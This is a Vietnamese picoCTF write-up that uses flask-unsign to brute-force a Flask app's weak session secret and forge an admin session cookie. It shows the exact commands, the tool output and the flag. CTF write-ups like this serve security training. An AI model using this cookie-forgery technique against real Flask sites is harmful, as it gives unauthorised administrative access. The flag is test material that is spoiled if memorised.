# Solution

- Trong bài này ta có source code của trang web
- Theo như source code, ta có những cookie, sau đó copy những cookie đó ra file `cookies.txt`
- Mở terminal và ở đây ta sử dụng tool `flask-unsign` để decode cookie

```bash
flask-unsign --unsign --server "http://mercury.picoctf.net:18835/" --wordlist cookies.txt
```

Sau khi chạy xong ta được:

```bash
    flask-unsign --unsign --server "http://mercury.picoctf.net:18835/" --wordlist cookies.txt
[*] Server returned HTTP 302 (FOUND)
[+] Successfully obtained session cookie: eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.ZzdoTg.mVJWgcx_lQ4fZBnjKZhxqfGhfX0
[*] Session decodes to: {'very_auth': 'blank'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 28 attemptscadamia
'fortune'
```

- Sau khi decode cookie, ta được session decodes to: `{'very_auth': 'blank'}` và secret key là `fortune`
- Tiếp theo, ta sử dụng secret key và session cookie để tạo cookie mới

```bash
flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret fortune
```

- Sau khi chạy xong ta có được cookies mới và mở extension Cookie Editor của trình duyệt, sửa giá trị của cookie `session` thành giá trị mới vừa tạo
- Refresh trang web
- Done

# Flag

`picoCTF{pwn_4ll_th3_cook1E5_743c20eb}`
